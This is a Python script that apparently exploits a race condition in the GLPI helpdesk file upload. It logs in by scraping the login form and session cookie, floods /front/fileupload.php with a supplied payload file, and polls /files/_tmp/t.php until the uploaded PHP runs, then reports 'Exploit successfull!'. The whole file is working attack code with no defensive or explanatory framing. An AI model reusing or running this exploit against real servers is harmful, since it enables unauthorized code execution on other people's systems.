import requests
import sys

from HTMLParser import HTMLParser
from urlparse import *

from lxml import html

import subprocess

def die(string):
	print(string)
	sys.exit(0)

class MyHTMLParser(HTMLParser):
	login_url=""
	action=""
	csrf=""
	user=""
	passw=""

	def handle_starttag(self, tag, attrs):
		
		if tag == 'form':
			for i in attrs:
				if 'action' in i:
					self.login_url=i[1]
					
		if tag == 'input':
			for i in attrs:
				if 'name' in i:
					store=i[1]
				if 'login_name' in i:
					self.user=store
				elif 'login_password' in i:
					self.passw=store
				elif 'submit' in i:
					self.action=store		
		
def parseInput(req,user,passwd):
	payload=""
	tree = html.fromstring(req.content)
	form=tree.find('.//form')
	rx=form.xpath('.//input')
	for i in rx:
		if i.get('id')=='login_name':
			payload+=i.name+"="+user+"&"
		elif i.get('id')=='login_password':
			payload+=i.name+"="+passwd+"&"
		elif i.type=='checkbox':
			payload+=i.name+"=ok&"
		else:
			payload+=i.name+"="+i.value+"&"
	payload=payload[:-1]
	return (form.action,payload)

def login(url, user, password,ver):
	parser = MyHTMLParser()
	print("[+]\tTrying to login:"+url+" as "+user)

	header={}
	header['User-Agent']="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
	header['Accept']="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	header['Accept-Language']="en-US,en;q=0.5"
	header['Accept-Encoding']="deflate"
	
	#verify per https!
	r=requests.get(url,headers=header,verify=ver)
	if r.status_code == 200:
		pd=parseInput(r,user,password)
	else:
		die("Error! I will print the page:\n" +r.text)
	
	sss=r.headers['Set-Cookie']
	sss=sss[:sss.find(';')]
	print("[?]\tParsing the HTML I suppose that the POST payload should be:\n[?]\t"+pd[1])
	header['Cookie']=str(sss)
	header['Referer']=url
	header['Content-Type']="application/x-www-form-urlencoded"
	url_login=urljoin(url,pd[0])

	r=requests.post(url_login,headers=header,data=pd[1],allow_redirects=False,verify=ver)

	if "Incorrect username or password" in r.text or 'Set-Cookie' not in r.headers:
		die("Incorrect credentials")
	auth=r.headers['Set-Cookie']
	auth=auth[:auth.find(';')].strip()
	print("[!]\tCorrect login! Session: "+auth)
	return auth
	
def put(url, session, f,stop,ver):
	#print("[+]\tLoop over upload file")
	f=open(f,'r')
	header={}
	header['User-Agent']="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
	header['Accept']="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	header['Accept-Language']="en-US,en;q=0.5"
	header['Accept-Encoding']="deflate"
	header['Cookie']=session
	header['Referer']=url+"/front/helpdesk.public.php?create_ticket=1"
	header['X-Requested-With']="XMLHttpRequest"
	header['Content-Type']='multipart/form-data; boundary=---------------------------213193102615077757121853802653'
	payload=f.read()
	url_upload=url+"/front/fileupload.php?name=filename&showfilesize=1"
	r=requests.post(url_upload,headers=header,data=payload,verify=ver)
	if r.status_code == 404:
		url_upload=url+"/ajax/fileupload.php"
	while True:
		r=requests.post(url_upload,headers=header,data=payload,verify=ver)
		if stop.is_set():
			break
	

def get(url, session,file_name,stop_event, ver):
	#print("[+]\tTrying to access file BEFORE the unlink")
	header={}
	header['User-Agent']="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
	header['Accept']="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	header['Accept-Language']="en-US,en;q=0.5"
	header['Accept-Encoding']="deflate"
	header['Cookie']=session
	header['Referer']=url+"/front/helpdesk.public.php?create_ticket=1"

	url_get=url+"/files/_tmp/t.php"

	while True:
		r=requests.get(url_get,headers=header,verify=ver)
		print r.status_code
		if r.status_code==200:
			print "\n[!]\tExploit successfull!\n"
			stop_event.set()
			break
		#if stop_event.is_set():
		#	break
